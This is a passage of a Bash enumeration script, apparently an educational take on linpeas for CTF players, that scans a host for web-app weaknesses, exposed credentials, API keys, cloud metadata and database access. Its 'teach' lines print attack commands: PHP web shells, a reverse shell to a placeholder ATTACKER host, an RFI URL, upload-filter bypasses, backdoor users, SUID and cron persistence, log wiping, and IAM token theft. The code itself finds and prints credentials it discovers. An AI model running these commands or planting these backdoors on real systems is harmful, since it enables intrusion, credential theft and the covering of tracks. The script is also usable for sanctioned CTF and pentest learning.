            teach "  1. Create simple PHP shell:"
            teach "     echo '<?php system(\$_GET[\"cmd\"]); ?>' > $webroot/shell.php"
            teach ""
            teach "  2. Make it hidden:"
            teach "     echo '<?php system(\$_GET[\"c\"]); ?>' > $webroot/.shell.php"
            teach ""
            teach "  3. Access via web:"
            teach "     curl http://localhost/shell.php?cmd=whoami"
            teach ""
            teach "  4. Upgrade to reverse shell:"
            teach "     curl 'http://localhost/shell.php?cmd=bash+-c+\"bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261\"'"
            log ""
        done < "$temp_writable_roots"
    fi
    
    # Report writable upload directories
    if [ -f "$temp_writable_uploads" ]; then
        while IFS='|' read -r upload_path htaccess_blocks; do
            if [ "$htaccess_blocks" = "1" ]; then
                warn "Upload directory writable but .htaccess may block PHP: $upload_path"
                teach "  .htaccess restricts PHP execution - check if it can be bypassed"
            else
                critical "Upload directory WRITABLE with PHP execution: $upload_path"
                vuln "Writable upload directory: $upload_path"
                log ""
                teach "╔═══════════════════════════════════════╗"
                teach "║  Upload Directory Exploitation"
                teach "╚═══════════════════════════════════════"
                teach ""
                teach "BYPASS TECHNIQUES:"
                teach "  1. Direct upload if no .htaccess:"
                teach "     echo '<?php system(\$_GET[\"c\"]); ?>' > $upload_path/shell.php"
                teach ""
                teach "  2. If .php blocked, try alternate extensions:"
                teach "     • .php3, .php4, .php5, .phtml, .phar"
                teach "     • shell.php.jpg (double extension bypass)"
                teach "     • shell.php%00.jpg (null byte - old PHP)"
                teach ""
                teach "  3. Upload .htaccess to enable PHP:"
                teach "     echo 'AddType application/x-httpd-php .jpg' > $upload_path/.htaccess"
                teach "     Then upload shell as .jpg"
                log ""
            fi
        done < "$temp_writable_uploads"
    fi
    
    # Report configs with credentials
    if [ -f "$temp_configs" ]; then
        while IFS='|' read -r config is_writable; do
            critical "Config contains credentials: $config"
            vuln "Configuration file with credentials: $config"
            
            # Show actual credentials (first 3 matches)
            grep -E "(password|passwd|secret|token|api[_-]?key)[\"']?\s*[:=]\s*[\"']?[^\"\s]{3,}" "$config" 2>/dev/null | \
            grep -vE "^\s*[#;/]|example" | head -3 | while read line; do
                log "    $line"
            done
            
            if [ "$is_writable" = "1" ]; then
                vuln "Config file is WRITABLE: $config"
                teach "  Modify to add backdoor credentials or change settings"
            fi
            log ""
        done < "$temp_configs"
    fi
    
    # Report WordPress installations
    if [ -f "$temp_wordpress" ]; then
        while IFS='|' read -r webroot wp_readable wp_writable has_backups has_xmlrpc has_json_api plugin_count; do
            vuln "WordPress installation: $webroot"
            
            if [ "$wp_readable" = "1" ]; then
                critical "wp-config.php is READABLE - contains database credentials"
                vuln "WordPress config readable: $webroot/wp-config.php"
                
                # Extract and show DB credentials
                if grep -E "DB_PASSWORD|DB_USER|DB_NAME" "$webroot/wp-config.php" 2>/dev/null | grep -q "."; then
                    critical "Database credentials in wp-config.php"
                    grep -E "DB_PASSWORD|DB_USER|DB_NAME|DB_HOST" "$webroot/wp-config.php" 2>/dev/null | grep -v "put your"
                fi
            fi
            
            if [ "$has_backups" = "1" ]; then
                critical "wp-config backup found - may contain credentials"
                find "$webroot" -maxdepth 1 -name "wp-config.php*" ! -name "wp-config.php" -readable 2>/dev/null
            fi
            
            if [ "$has_xmlrpc" = "1" ]; then
                warn "xmlrpc.php present - enables brute force amplification"
                teach "  Test: curl -d '<methodCall><methodName>system.listMethods</methodName></methodCall>' http://target/xmlrpc.php"
            fi
            
            if [ "$has_json_api" = "1" ]; then
                info "WordPress REST API present"
                teach "  Enumerate users: curl http://target/wp-json/wp/v2/users"
            fi
            
            if [ $plugin_count -gt 0 ]; then
                warn "Found $plugin_count installed plugins"
                ls -1 "$webroot/wp-content/plugins" 2>/dev/null | head -5 | while read plugin; do
                    log "  Plugin: $plugin"
                    if [ -f "$webroot/wp-content/plugins/$plugin/readme.txt" ]; then
                        local version=$(grep -i "stable tag" "$webroot/wp-content/plugins/$plugin/readme.txt" 2>/dev/null | head -1)
                        [ -n "$version" ] && info "  Version: $version" && teach "  Check exploit-db for: $plugin $version"
                    fi
                done
            fi
            log ""
        done < "$temp_wordpress"
    fi
    
    # Report frameworks
    if [ -f "$temp_frameworks" ]; then
        while IFS='|' read -r framework webroot extra1 extra2; do
            case "$framework" in
                Laravel)
                    if [ "$extra1" = "1" ]; then
                        critical "Laravel .env file readable: $webroot/.env"
                        vuln "Laravel .env exposed"
                    fi
                    ;;
                Django)
                    if [ "$extra2" = "1" ]; then
                        critical "Django settings contain credentials: $extra1"
                        vuln "Django settings exposed: $extra1"
                    fi
                    ;;
                Node.js)
                    if [ "$extra1" = "1" ]; then
                        critical "Node.js .env file readable"
                    fi
                    ;;
                Rails)
                    if [ "$extra1" = "1" ]; then
                        critical "Rails database.yml readable: $webroot/config/database.yml"
                        vuln "Rails database config exposed"
                    fi
                    ;;
            esac
        done < "$temp_frameworks"
    fi
    
    # Report logs with credentials
    if [ -f "$temp_log_creds" ]; then
        # Deduplicate log files
        sort -u "$temp_log_creds" | while IFS= read -r logfile; do
            warn "Access log contains credentials in URLs: $logfile"
            # Filter out CSRF tokens and other non-sensitive patterns
            grep -E "(password|passwd|pwd|api_key)=[^& ]{3,}" "$logfile" 2>/dev/null | \
            grep -vE "password=\*\*\*\*|token=[a-f0-9]{32,}" | tail -3 | while read line; do
                log "  $line"
            done
            teach "  Credentials submitted via GET are logged!"
            log ""
        done
    fi
    
    # Report web shells
    if [ -f "$temp_shells" ]; then
        while IFS='|' read -r phpfile confidence score; do
            critical "Potential web shell: $phpfile (confidence: $confidence)"
            vuln "Possible existing web shell: $phpfile"
            teach "  Suspicious function count: $score"
            teach "  Analyze: cat $phpfile | head -20"
            log ""
        done < "$temp_shells"
    fi
    
    # === PHASE 4: RUNNING WEB SERVER CHECK ===
    if netstat -tuln 2>/dev/null | grep -qE ":80 |:443 |:8080 "; then
        info "Web server is listening on common ports"
        
        # Identify web server type
        if ps aux | grep -iE "apache2|httpd" | grep -v grep | grep -q "."; then
            info "Apache web server detected"
            
            if [ $any_issues -gt 0 ]; then
                teach ""
                teach "Apache exploitation tips:"
                teach "  • Check for writable .htaccess"
                teach "  • Look for mod_cgi with writable cgi-bin"
                teach "  • Check Apache version for CVEs"
            fi
        fi
        
        if ps aux | grep -i nginx | grep -v grep | grep -q "."; then
            info "Nginx web server detected"
            
            if [ $any_issues -gt 0 ]; then
                teach ""
                teach "Nginx exploitation tips:"
                teach "  • Check nginx.conf for misconfigurations"
                teach "  • Look for path traversal via alias directive"
                teach "  • Check for writable sites-enabled configs"
            fi
        fi
        
        if [ $any_issues -gt 0 ]; then
            teach ""
            teach "General web exploitation:"
            teach "  • LFI: /index.php?page=../../../../etc/passwd"
            teach "  • RFI: /index.php?page=http://attacker/shell.txt"
            teach "  • Command injection: /script.php?file=test;whoami"
            teach "  • SQL injection in parameters"
        fi
    fi
    
    # === PHASE 5: CLEAN EXIT ===
    if [ "$any_issues" -eq 0 ]; then
        ok "No web application vulnerabilities detected"
    else
        log ""
        info "Web application enumeration complete"
        teach ""
        teach "Key web attack vectors found:"
        [ "$found_writable_webroot" -eq 1 ] 2>/dev/null && teach "  ✓ Writable web root = direct shell upload"
        [ "$found_writable_uploads" -eq 1 ] 2>/dev/null && teach "  ✓ Writable upload directories"
        [ "$found_credentials" -eq 1 ] 2>/dev/null && teach "  ✓ Config files with credentials"
        [ "$found_web_shells" -eq 1 ] 2>/dev/null && teach "  ✓ Existing web shells detected"
        [ "$found_wordpress" -eq 1 ] 2>/dev/null && teach "  ✓ WordPress installation found"
        [ "$found_frameworks" -eq 1 ] 2>/dev/null && teach "  ✓ Web frameworks detected"
    fi
}
# === POST-EXPLOITATION ===
enum_post_exploit() {
    [ $EXTENDED -eq 0 ] && return
    
    section "POST-EXPLOITATION OPPORTUNITIES"
    
    explain_concept "Post-Exploitation" \
        "After gaining initial access, establish persistence, gather credentials, and prepare for lateral movement." \
        "You might lose access (reboot, detection, session timeout). Persistence ensures you can return. Credentials enable lateral movement to other systems. Evidence should be minimized." \
        "Techniques:\n  • Backdoor accounts\n  • SSH key injection\n  • SUID shells\n  • Cron jobs\n  • Systemd services"
    
    # Check if we're root (for post-exploit suggestions)
    if [ $EUID -eq 0 ]; then
        info "Running as ROOT - post-exploitation options available"
        
        teach "Persistence techniques now available:"
        teach "  1. Add SSH key: echo 'YOUR_KEY' >> /root/.ssh/authorized_keys"
        teach "  2. Create SUID shell: cp /bin/bash /tmp/.hidden; chmod 4755 /tmp/.hidden"
        teach "  3. Add backdoor user: echo 'backdoor:\$1\$xyz\$HASH:0:0::/root:/bin/bash' >> /etc/passwd"
        teach "  4. Cron backdoor: echo '* * * * * root /tmp/.backdoor' >> /etc/crontab"
        
        teach "\nCredential harvesting:"
        teach "  • Dump /etc/shadow for offline cracking"
        teach "  • Extract SSH keys from /home/*/.ssh/"
        teach "  • Check browser saved passwords if GUI present"
        teach "  • Dump process memory for credentials: strings /proc/*/environ"
        
        teach "\nAnti-forensics:"
        teach "  • Clear logs: echo '' > /var/log/auth.log"
        teach "  • Clear history: history -c; rm ~/.bash_history"
        teach "  • Remove artifacts: rm /tmp/exploit*"
        
    else
        info "Not root yet - focus on privilege escalation first"
    fi
    
    # Network reconnaissance for lateral movement
    info "Internal network reconnaissance:"
    
    # Check for other hosts in ARP cache
    if command -v arp >/dev/null 2>&1; then
        local hosts=$(arp -a 2>/dev/null | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u | wc -l)
        if [ $hosts -gt 1 ]; then
            info "Found $hosts hosts in ARP cache"
            teach "Potential targets for lateral movement"
        fi
    fi
    
    # Check for SSH known_hosts
    find /home -name "known_hosts" 2>/dev/null | while read khosts; do
        if [ -r "$khosts" ]; then
            info "SSH known_hosts found: $khosts"
            teach "Contains previously accessed hosts - potential lateral movement targets"
        fi
    done
}

# === CTF FLAG HUNTING ===
enum_ctf_flags() {
    [ $EXTENDED -eq 0 ] && return
    [ $SHOW_FLAGS -eq 0 ] && return
    
    section "CTF FLAG HUNTING"
    
    teach "Looking for common CTF flag patterns and locations..."
    
    # Common flag patterns
    local flag_patterns=(
        "flag{.*}"
        "HTB{.*}"
        "THM{.*}"
        "CTF{.*}"
        "FLAG{.*}"
    )
    
    info "Checking common flag file locations:"
    
    # Root flags
    find /root -maxdepth 1 -name "root.txt" -o -name "flag.txt" -o -name "proof.txt" 2>/dev/null | while read flagfile; do
        if [ -r "$flagfile" ]; then
            ctf_flag "ROOT FLAG READABLE: $flagfile"
            vuln "ROOT FLAG FOUND: $flagfile"
            
            if [ $SHOW_FLAGS -eq 1 ]; then
                cat "$flagfile" 2>/dev/null
            else
                info "Use --flags to reveal flag contents"
            fi
        else
            warn "Root flag exists but not readable: $flagfile"
            teach "Get root to read this file"
        fi
    done
    
    # User flags
    find /home -maxdepth 2 -name "user.txt" -o -name "flag.txt" -o -name "local.txt" 2>/dev/null | while read flagfile; do
        if [ -r "$flagfile" ]; then
            ctf_flag "USER FLAG READABLE: $flagfile"
            vuln "USER FLAG FOUND: $flagfile"
            
            if [ $SHOW_FLAGS -eq 1 ]; then
                cat "$flagfile" 2>/dev/null
            else
                info "Use --flags to reveal flag contents"
            fi
        else
            warn "User flag exists but not readable: $flagfile"
            teach "Escalate to user $(stat -c %U "$flagfile" 2>/dev/null) to read this"
        fi
    done
    
    # Other flag locations
    find /var/www /opt -maxdepth 3 -name "*flag*" -o -name "*.txt" 2>/dev/null | while read flagfile; do
        if [ -r "$flagfile" ] && grep -qE "flag{|HTB{|THM{|CTF{|^[a-f0-9]{32}$" "$flagfile" 2>/dev/null; then
            ctf_flag "FLAG FOUND: $flagfile"
            vuln "FLAG FOUND: $flagfile"
            
            if [ $SHOW_FLAGS -eq 1 ]; then
                cat "$flagfile" 2>/dev/null
            else
                info "Use --flags to reveal flag contents"
            fi
        fi
    done
    
    info "Searching for flag patterns in readable files:"
    local pattern_count=0
    local total_patterns=5

    for pattern in "${flag_patterns[@]}"; do
    pattern_count=$((pattern_count + 1))
    echo -ne "\r[INFO] Checking pattern $pattern_count/$total_patterns..." >&2
    
    grep -rE "$pattern" /home /var/www /opt /tmp 2>/dev/null | grep -vE "teachpeas|learnpeas|\.log:|\.sh:" | head -5 | while read match; do
        echo -ne "\r\033[K"  # Clear progress line
        warn "Potential flag: $match"
    done
    done
    echo -ne "\r\033[K"  # Clear final progress line
    
    # Check current directory
    if ls user.txt root.txt flag.txt 2>/dev/null | grep -q .; then
        ctf_flag "FLAG FILE IN CURRENT DIRECTORY!"
        vuln "Flag file in current directory!"
        
        if [ $SHOW_FLAGS -eq 1 ]; then
            cat user.txt root.txt flag.txt 2>/dev/null
        else
            info "Use --flags to reveal flag contents"
        fi
    fi
    
    # Check for encoded flags
    info "Checking for base64-encoded flags:"
    find /home /var/www /opt -type f -readable 2>/dev/null | head -100 | while read file; do
        # Skip binary files
        if file "$file" | grep -q "text"; then
            if [ $(wc -l < "$file" 2>/dev/null) -eq 1 ]; then
               local content=$(cat "$file" 2>/dev/null)
               if echo "$content" | grep -qE "^[A-Za-z0-9+/=]{20,}$"; then
                   local decoded=$(echo "$content" | base64 -d 2>/dev/null)
                   if echo "$decoded" | grep -qE "flag{|HTB{|THM{|^[a-f0-9]{32}$"; then
                        ctf_flag "Base64-encoded flag in $file"
                        vuln "Base64-encoded flag in $file:"
                    
                        if [ $SHOW_FLAGS -eq 1 ]; then
                            echo "$decoded"
                        else
                            info "Use --flags to reveal flag contents"
                        fi
                    fi
                fi
            fi
        fi
    done
    
    # Check environment variables
    if env | grep -iE "flag|htb|thm" | grep -qv "EXTENDED|SHOW_FLAGS"; then
        info "Flag-related environment variables:"
        env | grep -iE "flag|htb|thm" | grep -v "EXTENDED\|SHOW_FLAGS"
    fi
    
    teach "\nCTF-specific hiding places:"
    teach "  • Steganography in images (use steghide, binwalk)"
    teach "  • Hidden in EXIF data (use exiftool)"
    teach "  • Encoded in environment variables"
    teach "  • In database tables"
    teach "  • In git commit history (.git/logs/HEAD)"
    teach "  • Hidden with alternate data streams (NTFS)"
    teach "  • Inside zip/tar archives"
}
# === NETWORK PIVOTING ===
enum_pivoting() {
    [ $EXTENDED -eq 0 ] && return
    
    section "NETWORK PIVOTING SETUP"
    
    explain_concept "Network Pivoting" \
        "Use compromised host as a jump point to access internal networks not directly reachable from your attack machine." \
        "Many networks have an external-facing host (DMZ) and internal hosts. Once you compromise the DMZ host, you can tunnel through it to reach internal services. Essential for multi-host CTF challenges." \
        "Common techniques:\n  • SSH tunneling (local/remote port forwarding)\n  • Chisel (SOCKS proxy over HTTP)\n  • Ligolo-ng (modern tunneling)\n  • Metasploit autoroute"
    
    # Check if we can SSH out
    if command -v ssh >/dev/null 2>&1; then
        info "SSH client available for tunneling"
        teach "SSH tunneling options:"
        teach "  Local forward: ssh -L 8080:internal_host:80 user@pivot"
        teach "  Remote forward: ssh -R 9001:localhost:443 attacker@YOUR_IP"
        teach "  Dynamic (SOCKS): ssh -D 1080 user@pivot"
    fi
    
    # Check for internal networks
    ip addr 2>/dev/null | grep -oE "inet ([0-9]{1,3}\.){3}[0-9]{1,3}" | awk '{print $2}' | while read ip; do
        local network=$(echo $ip | cut -d. -f1-3)
        
        case $network in
            192.168.*|172.16.*|172.17.*|172.18.*|172.19.*|172.20.*|172.21.*|172.22.*|172.23.*|172.24.*|172.25.*|172.26.*|172.27.*|172.28.*|172.29.*|172.30.*|172.31.*|10.*)
                info "Internal network detected: $network.0/24"
                teach "Scan this network from the compromised host:"
                teach "  for i in {1..254}; do ping -c 1 $network.\$i &>/dev/null && echo \$network.\$i; done"
                ;;
        esac
    done
    
    # Check for proxychains config
    if [ -f /etc/proxychains.conf ] || [ -f ~/.proxychains/proxychains.conf ]; then
        info "Proxychains is configured"
        teach "Use proxychains to route tools through this host"
    fi
}

# ═══════════════════════════════════════════════════
# PHASE 1: HIGH-VALUE ADDITIONS
# ═══════════════════════════════════════════════════

# === CLOUD METADATA SERVICES ===
enum_cloud_metadata() {
    section "CLOUD METADATA SERVICE ENUMERATION"
    
    explain_concept "Cloud Instance Metadata" \
        "Cloud providers expose instance metadata via HTTP endpoint. Contains credentials, SSH keys, user-data scripts." \
        "Cloud instances need to query their own metadata for configuration. AWS uses 169.254.169.254, Azure uses similar. If you're on a cloud instance, this endpoint contains IAM credentials, API keys, bootstrap scripts with passwords." \
        "Access:\n  AWS: curl http://169.254.169.254/latest/meta-data/\n  Azure: curl -H 'Metadata:true' http://169.254.169.254/metadata/instance?api-version=2021-02-01\n  GCP: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/"
    
    # Check if we can reach cloud metadata
    if command -v curl >/dev/null 2>&1; then
        # AWS Check
        if timeout 2 curl -s -f http://169.254.169.254/latest/meta-data/ >/dev/null 2>&1; then
            critical "AWS METADATA ACCESSIBLE - Steal IAM credentials for cloud access"
            vuln "AWS EC2 Metadata Service is ACCESSIBLE!"
            info "Instance metadata available at: http://169.254.169.254/latest/meta-data/"
            
            teach "AWS Metadata exploitation:"
            teach "  1. Get IAM role: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
            teach "  2. Get credentials: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
            teach "  3. Get user-data (bootstrap script): curl http://169.254.169.254/latest/user-data"
            teach "  4. Use credentials with AWS CLI for lateral movement"
            
            # Try to get actual creds
            local role=$(timeout 2 curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
            if [ -n "$role" ]; then
                critical "IAM Role found: $role - Extract credentials immediately"
                vuln "IAM Role found: $role"
                teach "Retrieve credentials: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$role"
            fi
        fi
        
        # Azure Check
        if timeout 2 curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null | grep -q "compute"; then
            critical "Azure metadata accessible - Extract managed identity tokens"
            vuln "Azure Instance Metadata Service is ACCESSIBLE!"
            teach "Azure Metadata exploitation:"
            teach "  curl -H 'Metadata:true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'"
            teach "  May contain managed identity tokens"
        fi
        
        # GCP Check
        if timeout 2 curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/" 2>/dev/null | grep -q "."; then
            critical "GCP metadata accessible - Extract service account tokens"
            vuln "GCP Metadata Service is ACCESSIBLE!"
            teach "GCP Metadata exploitation:"
            teach "  curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/"
            teach "  Get service account token: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
        fi
    else
        info "curl not available - cannot check cloud metadata"
    fi
}

# === LANGUAGE-SPECIFIC CREDENTIAL HUNTING ===
enum_language_creds() {
    section "LANGUAGE-SPECIFIC CREDENTIAL DISCOVERY"
    
    explain_concept "Framework Credentials" \
        "Modern web frameworks store credentials in .env files, config files, or package managers. These are often readable and contain database passwords, API keys, secret keys." \
        "Developers use environment variables for configuration (12-factor app methodology). .env files, package.json, composer.json, Gemfiles all can contain secrets. Left readable by accident or misconfiguration." \
        "Common locations:\n  • .env (all frameworks)\n  • package.json (Node.js)\n  • composer.json (PHP)\n  • requirements.txt (Python)\n  • Gemfile (Ruby)\n  • appsettings.json (ASP.NET)"
    
    # .env files (used by Laravel, Node.js, Rails, etc)
    info "Searching for .env files..."
    find / -name ".env" -type f -readable 2>/dev/null | head -20 | while read envfile; do
        vuln "Found .env file: $envfile"
        if grep -iE "password|secret|key|token|api" "$envfile" 2>/dev/null | head -5 | grep -q "."; then
            critical ".env file with credentials: $envfile"
            warn "Contains credentials:"
            grep -iE "password|secret|key|token|api" "$envfile" 2>/dev/null | head -5 | while read line; do
                log "  $line"
            done
        fi
    done
    
    # Node.js package.json
    info "Checking Node.js package.json files..."
    find / -name "package.json" -type f -readable 2>/dev/null | head -10 | while read pkgfile; do
        if grep -qE "password|token|secret" "$pkgfile" 2>/dev/null; then
            warn "package.json with secrets: $pkgfile"
            grep -E "password|token|secret" "$pkgfile" 2>/dev/null | head -3
        fi
        
        # Check for node_modules with known vulnerabilities
        local dir=$(dirname "$pkgfile")
        if [ -d "$dir/node_modules" ]; then
            info "Node modules at: $dir/node_modules"
            teach "Run 'npm audit' here to check for vulnerable packages"
        fi
    done
    
    # Python virtual environments
    info "Checking Python virtual environments..."
    find / -name "pyvenv.cfg" -o -name "activate" -type f 2>/dev/null | head -10 | while read venv; do
        local venvdir=$(dirname "$venv")
        info "Python venv: $venvdir"
        
        # Check for credentials in activate script
        if [ -f "$venvdir/activate" ]; then
            if grep -qE "PASSWORD|SECRET|TOKEN" "$venvdir/activate" 2>/dev/null; then
                warn "Credentials in activate script: $venvdir/activate"
            fi
        fi
    done
    
    # PHP composer.json
    info "Checking PHP composer.json files..."
    find / -name "composer.json" -type f -readable 2>/dev/null | head -10 | while read composer; do
        if grep -qE "password|token|auth" "$composer" 2>/dev/null; then
            warn "composer.json with secrets: $composer"
            grep -E "password|token|auth" "$composer" 2>/dev/null | head -3
        fi
    done
    
    # Ruby Gemfile
    info "Checking Ruby Gemfile files..."
    find / -name "Gemfile" -type f -readable 2>/dev/null | head -10 | while read gemfile; do
        info "Found Gemfile: $gemfile"
        if grep -qE "password|token" "$gemfile" 2>/dev/null; then
            warn "Gemfile contains credentials"
        fi
    done
    
    # ASP.NET configuration
    find / -name "appsettings.json" -o -name "web.config" -type f -readable 2>/dev/null | head -10 | while read config; do
        warn "Found ASP.NET config: $config"
        if grep -iE "connectionstring|password|secret" "$config" 2>/dev/null | head -3 | grep -q "."; then
            vuln "Config contains credentials!"
            grep -iE "connectionstring|password|secret" "$config" 2>/dev/null | head -3
        fi
    done
}
# ============================================
# API Keys and Token Search
# ============================================
enum_api_keys() {
    section "API KEYS & TOKEN DISCOVERY"
    
    explain_concept "API Key Exposure" \
        "Modern applications use API keys and tokens for authentication. These are often hardcoded in files, environment variables, or configuration." \
        "Developers hardcode credentials for testing and forget to remove them. CI/CD systems store secrets in config files. API keys provide direct access to cloud resources, databases, payment systems, and third-party services. One leaked AWS key can compromise entire infrastructure." \
        "Common patterns:\n  • AWS: AKIA[0-9A-Z]{16}\n  • GitHub: ghp_, gho_, ghs_\n  • Slack: xox[baprs]-\n  • Google API: AIza[0-9A-Za-z\\-_]{35}\n  • Stripe: sk_live_, pk_live_"
    
    info "Searching for API keys and tokens in common locations (this can take several minutes)..."
    warn "Press ENTER to skip this check and continue to next enumeration."
    
    # Define regex patterns
    local aws_pattern='AKIA[0-9A-Z]{16}'
    local github_pattern='gh[ps]_[0-9a-zA-Z]{36}'
    local slack_pattern='xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24,32}'
    local google_pattern='AIza[0-9A-Za-z\-_]{35}'
    local stripe_pattern='[sr]k_live_[0-9a-zA-Z]{24,}'
    local jwt_pattern='eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'
    
    # Exclusion pattern for binary files, caches, and false positive locations
    local exclude_patterns="teachpeas|learnpeas|linpeas|\.git|node_modules|\.cache|IndexedDB|\.sqlite|\.db|\.bin|[Cc]ache|\.ico|\.woff|\.ttf|\.eot|\.svg|Extensions|/etc/chromium"
    
    # Search in common locations
    local search_paths=("/home" "/var/www" "/opt" "/etc" "/tmp")
    local total_paths=${#search_paths[@]}
    local current=0
    local skip_api_keys=false
    
    # Function to check if user pressed Enter
    check_skip() {
        if read -t 0.01; then
            skip_api_keys=true
            echo -ne "\r\033[K" >&2
            info "Skipping API key enumeration..."
            return 1
        fi
        return 0
    }
    
    for path in "${search_paths[@]}"; do
        [ ! -d "$path" ] && continue
        check_skip || break
        
        current=$((current + 1))
        
        echo -ne "\r[INFO] Searching $path... ($current/$total_paths) - Press ENTER to skip" >&2
        
        # AWS Keys - added -I to skip binary files
        check_skip || break
        local aws_results=$(grep -rInE "$aws_pattern" "$path" 2>/dev/null | grep -vE "$exclude_patterns" | head -3)
        if [ -n "$aws_results" ]; then
            echo -ne "\r\033[K" >&2  # Clear progress line
            critical "AWS ACCESS KEY FOUND in $path - Full cloud access possible"
            vuln "AWS access key detected"
            echo "$aws_results" | while IFS=: read -r file line_num rest; do
                log "  File: $file (line $line_num)"
            done
        fi
        
        # GitHub Tokens - added -I to skip binary files
        check_skip || break
        local github_results=$(grep -rInE "$github_pattern" "$path" 2>/dev/null | grep -vE "$exclude_patterns" | head -3)
        if [ -n "$github_results" ]; then
            echo -ne "\r\033[K" >&2
            critical "GITHUB TOKEN FOUND in $path - Repository access possible"
            vuln "GitHub token detected"
            echo "$github_results" | while IFS=: read -r file line_num rest; do
                log "  File: $file (line $line_num)"
            done
        fi
        
        # Slack Tokens - added -I to skip binary files
        check_skip || break
        local slack_results=$(grep -rInE "$slack_pattern" "$path" 2>/dev/null | grep -vE "$exclude_patterns" | head -2)
        if [ -n "$slack_results" ]; then
            echo -ne "\r\033[K" >&2
            warn "Slack token detected in: $path"
            echo "$slack_results" | while IFS=: read -r file line_num rest; do
                log "  File: $file (line $line_num)"
            done
        fi
        
        # Google API Keys - added -I to skip binary files
        check_skip || break
        local google_results=$(grep -rInE "$google_pattern" "$path" 2>/dev/null | grep -vE "$exclude_patterns" | head -2)
        if [ -n "$google_results" ]; then
            echo -ne "\r\033[K" >&2
            warn "Google API key detected in: $path"
            echo "$google_results" | while IFS=: read -r file line_num rest; do
                log "  File: $file (line $line_num)"
            done
        fi
        
        # Stripe Keys - added -I to skip binary files
        check_skip || break
        local stripe_results=$(grep -rInE "$stripe_pattern" "$path" 2>/dev/null | grep -vE "$exclude_patterns" | head -2)
        if [ -n "$stripe_results" ]; then
            echo -ne "\r\033[K" >&2
            critical "STRIPE API KEY FOUND in $path - Payment system access"
            vuln "Stripe key detected"
            echo "$stripe_results" | while IFS=: read -r file line_num rest; do
                log "  File: $file (line $line_num)"
            done
        fi
        
        # JWT Tokens - added -I to skip binary files
        check_skip || break
        if grep -rIE "$jwt_pattern" "$path" 2>/dev/null | grep -vE "$exclude_patterns" | head -2 | grep -q "."; then
            echo -ne "\r\033[K" >&2
            warn "JWT token detected in: $path"
            teach "JWT tokens can be decoded at jwt.io to extract user information"
        fi
    done
    
    echo -ne "\r\033[K" >&2  # Clear final progress line
    
    # Check environment variables (only if not skipped)
    if ! $skip_api_keys; then
        info "Checking environment variables for secrets..."
        if env | grep -iE "api_key|api_secret|access_key|secret_key|password|token" | grep -qv "teachpeas"; then
            warn "Potential secrets in environment variables:"
            env | grep -iE "api_key|api_secret|access_key|secret_key|password|token" | grep -v "teachpeas" | head -5 | while read line; do
                log "  $line"
            done
        fi
        
        teach "\nAPI Key Exploitation:"
        teach "  • AWS keys: Use aws-cli to enumerate and pivot"
        teach "  • GitHub tokens: Clone private repos, read secrets"
        teach "  • Slack tokens: Read messages, exfiltrate data"
        teach "  • Stripe keys: Access payment/customer data"
    fi
    
    # Clear any remaining input
    read -t 0.01 -n 10000 discard 2>/dev/null || true
}

# === ENHANCED DATABASE CHECKS ===
enum_databases_extended() {
    section "ENHANCED DATABASE ENUMERATION"
    
    explain_concept "Database Privilege Escalation - Extended" \
        "Databases with weak configs or accessible sockets can lead to command execution or file access." \
        "Beyond default credentials, check for: UDF exploits, file read/write permissions, command execution features, socket permissions." \
        "MSSQL: xp_cmdshell for command execution\nMySQL: UDF for code execution\nPostgreSQL: COPY TO PROGRAM\nMongoDB: NoSQL injection in apps"
    
    # Enhanced MySQL checks
    if command -v mysql >/dev/null 2>&1; then
        info "Enhanced MySQL enumeration..."
        
        # Check for mysql config files with credentials
        for conf in /etc/mysql/my.cnf ~/.my.cnf /etc/my.cnf; do
            if [ -r "$conf" ]; then
                info "Found MySQL config: $conf"
                if grep -qE "password|user" "$conf" 2>/dev/null; then
                    warn "Config contains credentials:"
                    grep -E "password|user" "$conf" 2>/dev/null | grep -v "^#"
                fi
            fi
        done
        
        # Check for .mysql_history
        find /root /home -name ".mysql_history" -readable 2>/dev/null | while read hist; do
            warn "MySQL history file: $hist"
            teach "May contain passwords in CREATE USER or GRANT statements"
            if grep -iE "password|identified by" "$hist" 2>/dev/null | head -3 | grep -q "."; then
                vuln "History contains passwords!"
            fi
        done
    fi
    
    # MSSQL checks
    if command -v sqlcmd >/dev/null 2>&1; then
        info "MSSQL client (sqlcmd) is available"
        teach "MSSQL exploitation if accessible:"
        teach "  1. Enable xp_cmdshell: EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
        teach "  2. Execute commands: EXEC xp_cmdshell 'whoami';"
        teach "  3. Common default creds: sa/sa, sa/password"
    fi
    
    # MongoDB enhanced
    if command -v mongo >/dev/null 2>&1 || command -v mongosh >/dev/null 2>&1; then
        local mongo_cmd=$(command -v mongosh 2>/dev/null || command -v mongo 2>/dev/null)
        
        # Check if accessible without auth
        if timeout 3 $mongo_cmd --eval "db.version()" 2>/dev/null | grep -q "MongoDB"; then
            critical "MongoDB unauthenticated - Dump all databases"
            vuln "MongoDB is accessible WITHOUT authentication!"
            
            teach "MongoDB exploitation:"
            teach "  1. List databases: show dbs"
            teach "  2. Select DB: use <database>"
            teach "  3. Dump collections: db.<collection>.find()"
            teach "  4. Look for users, credentials, API keys"
            
            # Try to enumerate databases
            local dbs=$(timeout 3 $mongo_cmd --quiet --eval "db.adminCommand('listDatabases')" 2>/dev/null)
            if [ -n "$dbs" ]; then
                info "MongoDB databases found:"
                echo "$dbs" | grep -oE '"name" : "[^"]*"' | cut -d'"' -f4 | while read db; do
                    log "  - $db"
                done
            fi
        fi
    fi
    
    # Check for database dump files (exclude phpmyadmin system files)
